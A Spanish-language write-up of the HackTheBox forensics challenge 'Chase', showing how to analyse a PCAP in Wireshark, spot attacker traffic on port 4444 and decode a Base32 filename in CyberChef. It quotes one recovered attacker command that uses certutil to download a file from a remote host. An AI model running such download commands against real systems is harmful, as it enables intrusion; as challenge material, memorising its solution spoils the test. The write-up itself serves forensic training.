---
title: Chase
description: >
  HackTheBox Forensics Challenge - Easy<br>
  [Challenge Download](https://app.hackthebox.com/challenges/157)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","easy", "wireshark"]
---

---
### Enunciado del problema
*One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it. We've taken a network capture before shutting the server down to take a clone of the disk. Can you take a look at the PCAP and see if anything is up?*

Resumen: Un registro no autorizado en el servidor web de la red.

---
### Determinando víctima y atacante
Al ser un registro no autorizado en la web del servidor podemos intuir que sera por el protocolo *http*, entonces vamos a empezar filtrando por el protocolo:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/SniffingHTTP.png.png)

Encontramos el registro perfecto *después del handshake* y deducimos que lo siguiente:
- **IP Servidor** -> *22.22.22.7*
- **IP Atacante** -> *22.22.22.5*

**22.7** es el servidor web ya que en el último paquete de red, el emisor (*22.7*) devuelve el paquete al receptor (*22.5*) con un código de estado *200 OK* significando que la petición *GET* de *22.5* fue exitosa, también vamos a examinar este paquete de red para confirmar esta suposición:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/EndHandshake.png.png)

*PD: También podemos ver que esta haciendo una petición a un archivo .txt eso puede ser un archivo con credenciales o incluso la flag* 
## Siguiendo registro atacante
Para eso vamos a filtrar con el buscador de *wireshark* los paquetes que tengan como *ip emisora 22.22.22.5*.

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/RegistroAttck.png.png)

En uno de los archivos nos damos cuenta que después de la petición *GET /JBKEE---.txt* usa el puerto *4444* usado habitualmente para entablar conexión con la máquina victima, además de ser un puerto poco común en las peticiones de un servidor web...

En la información de este paquete, mostrada en hexadecimal, podemos ver que esta usando un comando para ver el archivo: **JBKEE---.txt** por segunda vez (primera mediante la petición web).
```powershell
certutil -urlcache -split -f http://22.22.22.7//JBKEE--.txt c:\users\public
```

## Obteniendo la flag
Ya viendo que el atacante intenta obtener el contenido de ese archivo, vamos a ver que significa su nombre... esto lo podemos hacer con herramientas de pentesting como *johntheripper* o una herramienta de blue team llamada **CyberChef**, que está disponible en web.

Dentro de esta web, pondremos el nombre del archivo en el placeholder superior (*input*)

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/WriteUps/BlueUps/Chase)ybercheff1.png.png]]

Y notamos que al lado de **Output** hay una barita que si hacemos *holding* (poner el ratón por encima) veremos que está encriptada en *Base32*

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/CyberChefOutput.png.png)

Hecho esto, en la parte de la izquierda nos saldrá lo que se llama un **STEP** y al darle al gran botón verde que pone *BAKE!* nos saldrá el resultado en texto plano.

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/CyberCheffOuytput.png.png)

Y ya tendríamos nuestra primera practica con *Wireshark* y *CyberChef*.